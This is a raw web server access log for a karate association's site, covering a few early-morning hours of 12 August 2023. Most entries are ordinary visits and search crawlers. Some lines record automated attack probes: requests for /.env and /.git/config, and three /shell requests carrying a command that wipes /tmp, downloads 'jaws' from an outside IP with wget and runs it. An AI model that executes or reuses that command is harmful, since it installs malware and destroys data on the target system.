::ffff:162.216.149.124 - - [12/Aug/2023:00:21:09 +0000] "GET / HTTP/1.1" 200 57490 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::ffff:198.235.24.203 - - [12/Aug/2023:00:42:42 +0000] "GET / HTTP/1.1" 200 57490 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::ffff:45.88.97.123 - - [12/Aug/2023:00:44:21 +0000] "GET /contact.html HTTP/1.0" 404 151 "http://wadokikai.org/contact.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36"
::ffff:45.88.97.123 - - [12/Aug/2023:00:44:22 +0000] "GET / HTTP/1.0" 200 57490 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36"
::ffff:45.88.97.123 - - [12/Aug/2023:00:44:23 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36"
::ffff:45.88.97.123 - - [12/Aug/2023:00:44:24 +0000] "GET /?err=error HTTP/1.0" 200 58042 "http://wadokikai.org/?err=error#signup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36"
::ffff:43.155.118.219 - - [12/Aug/2023:00:45:32 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:65.151.183.244 - - [12/Aug/2023:00:53:21 +0000] "GET / HTTP/1.1" 200 57490 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.2 Mobile/15E148 Safari/604.1"
::ffff:65.151.183.244 - - [12/Aug/2023:00:53:21 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.2 Mobile/15E148 Safari/604.1"
::ffff:65.151.183.244 - - [12/Aug/2023:00:53:21 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.2 Mobile/15E148 Safari/604.1"
::ffff:65.151.183.244 - - [12/Aug/2023:00:53:21 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.2 Mobile/15E148 Safari/604.1"
::ffff:65.151.183.243 - - [12/Aug/2023:00:53:21 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.2 Mobile/15E148 Safari/604.1"
::ffff:65.151.183.244 - - [12/Aug/2023:00:53:22 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 200 34167 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.2 Mobile/15E148 Safari/604.1"
::ffff:65.151.183.244 - - [12/Aug/2023:00:53:22 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 200 35262 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.2 Mobile/15E148 Safari/604.1"
::ffff:65.151.183.244 - - [12/Aug/2023:00:53:22 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 200 37245 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.2 Mobile/15E148 Safari/604.1"
::ffff:65.151.183.244 - - [12/Aug/2023:00:53:22 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 200 36421 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.2 Mobile/15E148 Safari/604.1"
::ffff:65.151.183.243 - - [12/Aug/2023:00:53:22 +0000] "GET /images/dragon-trans.png HTTP/1.1" 200 85661 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.2 Mobile/15E148 Safari/604.1"
::ffff:65.151.183.244 - - [12/Aug/2023:00:53:23 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 200 42667 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.2 Mobile/15E148 Safari/604.1"
::ffff:65.151.183.243 - - [12/Aug/2023:00:53:23 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 200 41366 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.2 Mobile/15E148 Safari/604.1"
::ffff:65.151.183.244 - - [12/Aug/2023:00:53:23 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 200 32400 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.2 Mobile/15E148 Safari/604.1"
::ffff:65.151.183.241 - - [12/Aug/2023:00:53:23 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 200 37724 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.2 Mobile/15E148 Safari/604.1"
::ffff:65.151.183.242 - - [12/Aug/2023:00:53:23 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 200 55402 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.2 Mobile/15E148 Safari/604.1"
::ffff:65.151.183.244 - - [12/Aug/2023:00:53:25 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.2 Mobile/15E148 Safari/604.1"
::ffff:65.151.183.244 - - [12/Aug/2023:00:53:26 +0000] "GET /images/tiger.bmp HTTP/1.1" 200 311274 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.2 Mobile/15E148 Safari/604.1"
::ffff:65.151.183.244 - - [12/Aug/2023:00:53:29 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 200 35066 "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.2 Mobile/15E148 Safari/604.1"
::ffff:65.151.183.243 - - [12/Aug/2023:00:54:05 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.2 Mobile/15E148 Safari/604.1"
::ffff:185.254.196.173 - - [12/Aug/2023:01:03:20 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.173 - - [12/Aug/2023:01:03:20 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:3.238.24.144 - - [12/Aug/2023:01:06:18 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Linux; U; Android 2.1; en-us; HTC Legend Build/cupcake) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17"
::ffff:71.202.150.146 - - [12/Aug/2023:01:12:04 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.2 Mobile/15E148 Safari/604.1"
::ffff:71.202.150.146 - - [12/Aug/2023:01:12:21 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.2 Mobile/15E148 Safari/604.1"
::ffff:71.202.150.146 - - [12/Aug/2023:01:12:29 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.2 Mobile/15E148 Safari/604.1"
::ffff:154.17.188.14 - - [12/Aug/2023:01:24:20 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36"
::ffff:192.241.195.77 - - [12/Aug/2023:01:36:18 +0000] "GET /actuator/health HTTP/1.1" 404 154 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:114.119.143.166 - - [12/Aug/2023:01:48:20 +0000] "GET /docs/Twenty%20guiding%20principles%20of%20Karate.pdf HTTP/1.1" 200 49483 "https://wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:135.125.244.48 - - [12/Aug/2023:01:54:41 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [12/Aug/2023:01:54:41 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:222.222.180.200 - - [12/Aug/2023:01:56:49 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+94.158.247.123/jaws;sh+/tmp/jaws HTTP/1.1" - - "-" "Hello, world"
::ffff:101.74.200.170 - - [12/Aug/2023:01:56:53 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+94.158.247.123/jaws;sh+/tmp/jaws HTTP/1.1" - - "-" "Hello, world"
::ffff:60.221.59.173 - - [12/Aug/2023:01:56:53 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+94.158.247.123/jaws;sh+/tmp/jaws HTTP/1.1" - - "-" "Hello, world"
::ffff:66.249.66.161 - - [12/Aug/2023:02:06:36 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.66.194 - - [12/Aug/2023:02:06:38 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.org/" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/114.0.5735.179 Safari/537.36"
::ffff:66.249.66.85 - - [12/Aug/2023:02:06:38 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.org/" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/114.0.5735.179 Safari/537.36"
::ffff:54.36.112.44 - - [12/Aug/2023:02:10:26 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:54.36.112.44 - - [12/Aug/2023:02:10:26 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:43.155.118.219 - - [12/Aug/2023:02:21:09 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:52.35.20.1 - - [12/Aug/2023:02:23:10 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "YelpBot (https://www.yelp.com/)"
::ffff:52.35.20.1 - - [12/Aug/2023:02:23:10 +0000] "GET / HTTP/1.1" 200 57490 "-" "YelpBot (https://www.yelp.com/)"
::ffff:52.35.20.1 - - [12/Aug/2023:02:23:10 +0000] "GET /contact?s=1&ss=8 HTTP/1.1" 200 9997 "http://www.wadokikai.org" "YelpBot (https://www.yelp.com/)"
::ffff:52.35.20.1 - - [12/Aug/2023:02:23:10 +0000] "GET /contact?s=1&ss=1 HTTP/1.1" 200 9997 "http://www.wadokikai.org" "YelpBot (https://www.yelp.com/)"
::ffff:52.35.20.1 - - [12/Aug/2023:02:23:10 +0000] "GET /contact?s=1&ss=0 HTTP/1.1" 200 9997 "http://www.wadokikai.org" "YelpBot (https://www.yelp.com/)"
::ffff:52.35.20.1 - - [12/Aug/2023:02:23:10 +0000] "GET /contact?s=1&ss=6 HTTP/1.1" 200 9997 "http://www.wadokikai.org" "YelpBot (https://www.yelp.com/)"
::ffff:52.35.20.1 - - [12/Aug/2023:02:23:10 +0000] "GET /contact?s=1&ss=5 HTTP/1.1" 200 9997 "http://www.wadokikai.org" "YelpBot (https://www.yelp.com/)"
::ffff:52.35.20.1 - - [12/Aug/2023:02:23:10 +0000] "GET /contact?s=1&ss=10 HTTP/1.1" 200 9997 "http://www.wadokikai.org" "YelpBot (https://www.yelp.com/)"
::ffff:52.35.20.1 - - [12/Aug/2023:02:23:11 +0000] "GET /contact?s=1&ss=2 HTTP/1.1" 200 9997 "http://www.wadokikai.org" "YelpBot (https://www.yelp.com/)"
::ffff:52.35.20.1 - - [12/Aug/2023:02:23:11 +0000] "GET /contact?s=1&ss=11 HTTP/1.1" 200 9997 "http://www.wadokikai.org" "YelpBot (https://www.yelp.com/)"
::ffff:52.35.20.1 - - [12/Aug/2023:02:23:11 +0000] "GET /events HTTP/1.1" 200 5867 "http://www.wadokikai.org" "YelpBot (https://www.yelp.com/)"
::ffff:52.35.20.1 - - [12/Aug/2023:02:23:11 +0000] "GET /contact?s=1&ss=4 HTTP/1.1" 200 9997 "http://www.wadokikai.org" "YelpBot (https://www.yelp.com/)"
::ffff:52.35.20.1 - - [12/Aug/2023:02:23:11 +0000] "GET /schools HTTP/1.1" 200 97308 "http://www.wadokikai.org" "YelpBot (https://www.yelp.com/)"
::ffff:52.35.20.1 - - [12/Aug/2023:02:23:11 +0000] "GET /contact?s=1&ss=9 HTTP/1.1" 200 9997 "http://www.wadokikai.org" "YelpBot (https://www.yelp.com/)"
::ffff:52.35.20.1 - - [12/Aug/2023:02:23:11 +0000] "GET /contact?s=1&ss=7 HTTP/1.1" 200 9997 "http://www.wadokikai.org" "YelpBot (https://www.yelp.com/)"
::ffff:52.35.20.1 - - [12/Aug/2023:02:23:11 +0000] "GET /contact HTTP/1.1" 200 10017 "http://www.wadokikai.org" "YelpBot (https://www.yelp.com/)"
::ffff:52.35.20.1 - - [12/Aug/2023:02:23:11 +0000] "GET /resources HTTP/1.1" 200 194907 "http://www.wadokikai.org" "YelpBot (https://www.yelp.com/)"
::ffff:52.35.20.1 - - [12/Aug/2023:02:23:11 +0000] "GET /contact?s=1&ss=3 HTTP/1.1" 200 9997 "http://www.wadokikai.org" "YelpBot (https://www.yelp.com/)"
::ffff:54.88.179.33 - - [12/Aug/2023:02:27:17 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 \(Windows NT 10.0\; Win64\; x64\) AppleWebKit/537.36 \(KHTML, like Gecko\) Chrome/100.0.4896.60 Safari/537.36"
::ffff:54.88.179.33 - - [12/Aug/2023:02:27:18 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 \(Windows NT 10.0\; Win64\; x64\) AppleWebKit/537.36 \(KHTML, like Gecko\) Chrome/100.0.4896.60 Safari/537.36"
::ffff:35.171.144.152 - - [12/Aug/2023:02:27:18 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 \(Windows NT 10.0\; Win64\; x64\) AppleWebKit/537.36 \(KHTML, like Gecko\) Chrome/100.0.4896.60 Safari/537.36"
::ffff:52.167.144.44 - - [12/Aug/2023:02:28:01 +0000] "GET /resources HTTP/1.1" 200 194907 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:66.249.66.84 - - [12/Aug/2023:02:32:44 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.66.10 - - [12/Aug/2023:02:32:44 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.179 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.66.83 - - [12/Aug/2023:02:35:31 +0000] "GET /ads.txt HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.66.32 - - [12/Aug/2023:02:35:32 +0000] "GET /ads.txt HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:35.166.126.17 - - [12/Aug/2023:02:36:44 +0000] "GET /.well-known/acme-challenge/JZtHfVH69Cbeo3NtA7nUlJYVgj5-9pEO2kw8XR7ry-4 HTTP/1.1" 404 209 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
::ffff:23.178.112.102 - - [12/Aug/2023:02:36:44 +0000] "GET /.well-known/acme-challenge/JZtHfVH69Cbeo3NtA7nUlJYVgj5-9pEO2kw8XR7ry-4 HTTP/1.1" 404 209 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
::ffff:35.166.126.17 - - [12/Aug/2023:02:36:49 +0000] "GET /.well-known/acme-challenge/KwywD1HqZf-SHyXeKkMpCBoBUMA-rwPIanMO4IMEIeQ HTTP/1.1" 404 209 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
::ffff:23.178.112.106 - - [12/Aug/2023:02:36:49 +0000] "GET /.well-known/acme-challenge/KwywD1HqZf-SHyXeKkMpCBoBUMA-rwPIanMO4IMEIeQ HTTP/1.1" 404 209 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
::ffff:185.191.171.19 - - [12/Aug/2023:02:43:42 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
::ffff:85.208.96.198 - - [12/Aug/2023:02:43:43 +0000] "GET /contact?s=1&ss=9 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
::ffff:185.254.196.173 - - [12/Aug/2023:02:48:24 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.173 - - [12/Aug/2023:02:48:24 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:165.231.182.25 - - [12/Aug/2023:02:56:19 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.8 (KHTML, like Gecko) Chrome/6.0.397.0 Safari/533.8"
::ffff:66.249.66.195 - - [12/Aug/2023:03:04:44 +0000] "GET / HTTP/1.1" 304 - "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.66.194 - - [12/Aug/2023:03:04:47 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.org/" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/114.0.5735.179 Safari/537.36"
::ffff:66.249.66.194 - - [12/Aug/2023:03:04:47 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.org/" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/114.0.5735.179 Safari/537.36"
::ffff:135.125.246.189 - - [12/Aug/2023:03:18:43 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [12/Aug/2023:03:18:44 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:205.210.31.9 - - [12/Aug/2023:03:28:27 +0000] "GET / HTTP/1.1" 200 57490 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::ffff:51.222.253.18 - - [12/Aug/2023:03:37:10 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:34.255.191.240 - - [12/Aug/2023:03:39:13 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "webprosbot/2.0 (+mailto:abuse-6337@webpros.com)"
::ffff:34.255.191.240 - - [12/Aug/2023:03:39:14 +0000] "GET / HTTP/1.1" 200 57490 "-" "webprosbot/2.0 (+mailto:abuse-6337@webpros.com)"
::ffff:94.102.61.7 - - [12/Aug/2023:03:50:08 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "python-requests/2.26.0"
::ffff:94.102.61.7 - - [12/Aug/2023:03:50:08 +0000] "GET / HTTP/1.1" 200 57490 "-" "python-requests/2.26.0"
::ffff:43.155.118.219 - - [12/Aug/2023:03:56:37 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
